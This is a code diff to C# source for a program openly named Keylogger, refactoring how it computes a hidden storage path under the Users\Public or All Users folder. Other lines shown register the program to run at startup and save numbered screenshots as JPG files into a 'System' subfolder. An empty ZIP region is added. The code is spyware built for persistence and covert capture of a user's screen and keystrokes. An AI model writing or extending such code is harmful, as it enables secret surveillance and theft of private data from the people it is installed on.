@@ -9,7 +9,6 @@ using System.Drawing;
 using System.Windows.Interop;
 using System.Collections.Generic;
 using System.Diagnostics;
-//using System.IO.Compression;
 
 namespace Keylogger
 {
@@ -18,7 +17,10 @@ namespace Keylogger
 
     public class AutoRun
     {
-        
+        static AutoRun()
+        {
+            GetPath();
+        }
         public static bool SetAutoRun(bool autorun, string path)
         {
             const string name = "Keylogger";
@@ -61,10 +63,14 @@ namespace Keylogger
             return true;
         }
 
-        public static string Path()
+        public static string Path
+        {
+            get; private set; }
+
+        private static void GetPath()
         {
             int majorVer = Environment.OSVersion.Version.Major;
-            string path;
+            
             //MessageBox.Show(Environment.OSVersion.Version.Minor.ToString());
             //Windows XP
             string str = Environment.SystemDirectory.Remove(3);
@@ -72,13 +78,12 @@ namespace Keylogger
             //MessageBox.Show(str);
             if (majorVer < 6)
             {
-                path = str + @"Documents and Settings\All Users\";
-                return path;
+                Path = str + @"Documents and Settings\All Users\";
+                
             }
             else
             {
-                path = str + @"Users\Public\";
-                return path;
+                Path = str + @"Users\Public\";
             }
 
         }
@@ -396,7 +401,7 @@ namespace Keylogger
 
         public static void ScreenSave(string numscreen)
         {
-            string path = AutoRun.Path()+"\\System\\" + numscreen + ".jpg";
+            string path = AutoRun.Path+"\\System\\" + numscreen + ".jpg";
            // string path = AutoRun.Path() +  "Key.rtf";
             
             
@@ -427,7 +432,10 @@ namespace Keylogger
 
     #endregion
 
-   
+    #region ZIP
+    
+    #endregion
+
     public enum WindowsHotKey
     {
         Alt = 0x0001,
